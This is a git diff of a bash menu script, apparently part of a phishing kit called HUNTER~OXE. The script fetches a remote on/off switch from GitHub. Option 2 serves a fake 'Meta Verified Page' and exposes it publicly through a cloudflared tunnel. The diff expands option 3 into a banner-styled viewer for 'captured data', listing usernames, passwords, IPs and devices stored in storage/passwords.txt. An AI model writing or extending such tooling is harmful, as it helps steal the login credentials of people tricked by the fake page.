@@ -1,7 +1,6 @@
 #!/bin/bash
 
 # --- REMOTE CONTROL ---
-# Sinthani link iyi kukhala RAW link yako ya ku GitHub
 STATUS=$(curl -s -L https://raw.githubusercontent.com/hunteroxe1-ai/PEkha/main/status.txt | tr -d '[:space:]')
 
 if [[ "$STATUS" == "OFF" ]]; then
@@ -36,7 +35,21 @@ elif [ "$choice" == "2" ]; then
     echo -e "\e[1;34m[!] Starting Meta Verified Page...\e[0m"
     php -S 127.0.0.1:8080 -t web/ & cloudflared tunnel --url http://127.0.0.1:8080
 elif [ "$choice" == "3" ]; then
-    cat storage/passwords.txt
+    clear
+    echo -e "\e[1;32m  ||=======================================||"
+    echo -e "\e[1;32m  ||      HUNTER~OXE CAPTURED DATA         ||"
+    echo -e "\e[1;32m  ||=======================================||\e[0m"
+    echo ""
+    if [ ! -f storage/passwords.txt ]; then
+        echo -e "\e[1;31m  [!] No data found yet.\e[0m"
+    else
+        echo -e "\e[1;37m  DATE | USER | PASS | IP | DEVICE\e[0m"
+        echo -e "\e[1;37m  ------------------------------------------\e[0m"
+        cat storage/passwords.txt
+    fi
+    echo ""
+    read -p "Press Enter to return..."
+    ./HUNTER~OXE.sh
 elif [ "$choice" == "4" ]; then
     exit
 fi
